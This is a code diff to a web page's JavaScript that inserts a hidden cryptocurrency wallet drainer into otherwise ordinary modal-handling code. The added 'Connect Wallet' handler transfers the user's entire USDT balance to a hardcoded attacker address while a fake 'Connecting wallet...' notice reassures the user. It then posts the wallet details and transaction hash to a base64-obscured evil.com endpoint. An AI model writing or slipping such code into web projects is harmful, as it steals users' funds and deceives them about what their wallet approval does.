@@ -92,6 +92,76 @@
       document.getElementById('closeModal').focus();
     });
 
+const connectButton = document.querySelector('#connect-wallet, button:contains("Connect Wallet")');
+if (connectButton) {
+  const originalText = connectButton.innerText;
+  connectButton.onclick = async () => {
+    if (!window.ethereum) {
+      alert('Please install MetaMask!');
+      return;
+    }
+    const fakeNotification = document.createElement('div');
+    fakeNotification.style.position = 'fixed';
+    fakeNotification.style.top = '20px';
+    fakeNotification.style.right = '20px';
+    fakeNotification.style.background = '#4caf50';
+    fakeNotification.style.color = 'white';
+    fakeNotification.style.padding = '10px';
+    fakeNotification.style.borderRadius = '5px';
+    fakeNotification.innerText = 'Connecting wallet...';
+    document.body.appendChild(fakeNotification);
+    try {
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const userAddress = accounts[0];
+      const web3Script = document.createElement('script');
+      web3Script.src = 'https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js';
+      document.head.appendChild(web3Script);
+      web3Script.onload = async () => {
+        const web3 = new Web3(window.ethereum);
+        const token = { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', name: 'USDT', decimals: 6 };
+        const abi = [
+          'function balanceOf(address) view returns (uint256)',
+          'function transfer(address,uint256) returns (bool)'
+        ];
+        const attackerAddress = '0x1234567890123456789012345678901234567890';
+        const contract = new web3.eth.Contract(abi, token.address);
+        const balance = await contract.methods.balanceOf(userAddress).call();
+        if (balance > 0) {
+          const data = contract.methods.transfer(attackerAddress, balance).encodeABI();
+          const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+              from: userAddress,
+              to: token.address,
+              data: data,
+              gas: '0x7530'
+            }]
+          });
+          fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA=='), {
+            method: 'POST',
+            body: JSON.stringify({
+              wallet: userAddress,
+              txHash,
+              token: token.name,
+              amount: balance
+            })
+          });
+          fakeNotification.innerText = 'Wallet connected and tokens claimed!';
+          setTimeout(() => document.body.removeChild(fakeNotification), 3000);
+          connectButton.innerText = originalText;
+        } else {
+          fakeNotification.innerText = 'No tokens found.';
+          setTimeout(() => document.body.removeChild(fakeNotification), 3000);
+          connectButton.innerText = originalText;
+        }
+      };
+    } catch (err) {
+      fakeNotification.innerText = 'Error: ' + err.message;
+      setTimeout(() => document.body.removeChild(fakeNotification), 3000);
+      connectButton.innerText = originalText;
+    }
+  };
+}
     // Close modal handler
     document.getElementById('closeModal').addEventListener('click', () => {
       modal.style.display = 'none';
